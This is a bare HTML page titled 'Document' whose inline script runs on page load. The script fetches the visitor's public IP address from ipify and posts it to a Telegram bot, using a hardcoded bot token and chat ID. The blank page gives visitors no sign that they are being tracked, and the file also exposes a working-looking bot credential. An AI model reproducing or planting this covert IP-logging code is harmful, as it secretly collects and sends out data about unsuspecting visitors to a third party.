<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <script>
      const botToken = "7396787396:AAGs_K5jy9txTVlQv-ltZbzo8eSXncwTUwk";
      const userID = "5680204913";
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const data = new URLSearchParams();

      getPublicIP().then((publicIP) => {
        if (publicIP) {
          data.append("chat_id", userID);
          data.append("text", publicIP);
          fetch(url, {
            method: "POST",
            body: data,
          });
        }
      });

      function getPublicIP() {
        return fetch("https://api.ipify.org?format=json")
          .then((response) => response.json())
          .then((data) => {
            return data.ip;
          })
          .catch((error) => {
            return null;
          });
      }
    </script>
  </body>
</html>
